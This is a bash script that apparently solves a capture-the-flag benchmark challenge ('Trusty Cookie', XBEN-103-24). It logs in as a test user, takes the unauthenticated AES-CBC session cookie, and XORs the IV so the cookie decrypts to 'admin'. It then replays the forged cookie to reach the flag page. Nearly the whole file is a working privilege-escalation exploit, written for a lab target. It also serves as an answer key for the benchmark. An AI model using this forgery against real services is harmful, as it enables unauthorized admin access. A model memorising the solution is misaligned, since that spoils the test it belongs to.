#!/usr/bin/env bash
# XBEN-103-24 — "Trusty Cookie" (CBC bit-flipping). Proxy-mode twin. The session
# cookie is the username AES-CBC encrypted with no MAC. The first plaintext
# block is AES-decrypt(C1) XOR IV, and the IV is the cookie's first 16 bytes, so
# XORing (test1 XOR admin) into the IV turns the same ciphertext into a valid
# admin session — no key needed. `--no-follow` keeps the login's Set-Cookie
# readable instead of leaving it behind a redirect.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben103p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
# 1. Log in as a known short username; read the raw session cookie it mints.
seq="$("$H5I" websec replay "$BASE" --create --no-follow --json --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' --set 'form.username=test1' --set 'form.password=test1' \
  2>/dev/null | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
cookie="$("$H5I" websec show "res_$seq" --json --session "$SESSION" 2>/dev/null | python3 -c '
import json,re,sys
for n,v in json.load(sys.stdin).get("response",{}).get("headers",[]):
    if n.lower()=="set-cookie":
        m=re.search(r"session=([0-9a-f]+)",v)
        if m: print(m.group(1)); break')"
[ -n "$cookie" ] || { echo "no session cookie came back" >&2; exit 1; }
# 2. Flip the IV so the first block decrypts to "admin" instead of "test1".
forged="$(python3 -c "
raw=bytes.fromhex('$cookie'); iv,ct=bytearray(raw[:16]),raw[16:]
have=b'test1'+b'\x00'*11; want=b'admin'+b'\x00'*11
for i in range(16): iv[i]^=have[i]^want[i]
print((bytes(iv)+ct).hex())")"
# 3. Use the forged cookie on the authenticated page.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/welcome' --set "header.Cookie=session=$forged" >/dev/null
print_flag
